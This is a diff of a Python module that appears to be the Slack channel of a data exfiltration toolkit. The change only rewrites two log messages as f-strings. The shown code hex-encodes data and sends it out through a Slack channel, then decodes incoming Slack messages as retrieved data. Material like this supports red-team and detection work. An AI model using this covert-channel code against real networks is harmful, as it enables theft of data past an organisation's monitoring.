@@ -9,7 +9,9 @@ sc = None
 def send(data):
     global sc
     chan = config['chan_id']
-    app_exfiltrate.log_message('info', "[slack] Sending {} bytes with Slack".format(len(data)))
+    app_exfiltrate.log_message(
+        'info', f"[slack] Sending {len(data)} bytes with Slack"
+    )
     data = data.encode('hex')
 
     sc.api_call("api.text")
@@ -23,7 +25,10 @@ def listen():
             try:
                 raw_data = sc.rtm_read()[0]
                 if 'text' in raw_data:
-                    app_exfiltrate.log_message('info', "[slack] Receiving {} bytes with Slack".format(len(raw_data['text'])))
+                    app_exfiltrate.log_message(
+                        'info',
+                        f"[slack] Receiving {len(raw_data['text'])} bytes with Slack",
+                    )
                     app_exfiltrate.retrieve_data(raw_data['text'].decode('hex'))
             except:
                 pass
